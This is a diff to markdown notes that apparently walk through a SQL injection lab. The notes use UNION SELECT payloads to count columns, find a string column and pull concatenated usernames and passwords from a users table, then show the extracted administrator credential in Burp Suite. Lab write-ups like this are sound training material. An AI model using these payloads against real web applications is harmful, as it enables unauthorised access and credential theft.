@@ -79,8 +79,9 @@ Content in the first column | Content in the second column
    By applying `'+UNION+SELECT+NULL,NULL--` we can say the database has tow columns.
    By applying `'+UNION+SELECT+NULL,'abc'--` we can ay the second column has string values.
    Now to retrieve data from only one column we can use the following payload
-   `'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- `
-   ||'~'|| will join `username and password` like  administrator~wet39rb7kc6kt99lq0o6
+   `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
+   
+    >||'~'|| will join `username and password` like  administrator~wet39rb7kc6kt99lq0o6
    
  Now to solve the challenge go to Response in Burp Suite and get the username~password `administrator~wet39rb7kc6kt99lq0o6`
  
